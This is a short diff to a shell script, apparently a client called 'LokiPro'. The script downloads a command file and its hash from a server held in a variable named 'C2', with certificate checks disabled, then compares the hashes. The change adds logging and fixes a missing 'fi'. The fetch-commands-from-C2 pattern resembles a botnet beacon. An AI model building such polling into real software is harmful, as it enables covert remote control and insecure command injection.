@@ -15,7 +15,8 @@ CONFIG
 $WGET -O $LOKIHOME/$MYNAME-command.txt --no-check-certificate $C2PROTO$C2/$MYNAME
 if [ -f "$LOKIHOME/$MYNAME-command.txt " ]; then 
     # If we downloaded a file, download the hash for it 
-	$WGET -O $LOKIHOME/$MYNAME-command.hash --no-check-certificate $C2PROTO$C2/$MYNAME.hash 
+	$LOG "Downloaded $LOKIHOME/$MYNAME-command.txt, checking for $C2PROTO$C2/$MYNAME.hash"
+	$WGET -O $LOKIHOME/$MYNAME-command.hash --no-check-certificate "$C2PROTO$C2/$MYNAME.hash"
 	
 	# Create a hash of the file that we downloaded to compare to the hash that we downloaded
     sha256sum $LOKIHOME/$MYNAME-command.txt > $LOKIHOME/$MYNAME-command.check
@@ -39,6 +40,7 @@ if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
 		$LOG "No Change in Command"
 		# If they are the same, do nothing
 		fi
+	fi 
 else
     echo "LokiPro Nothing found"
 fi
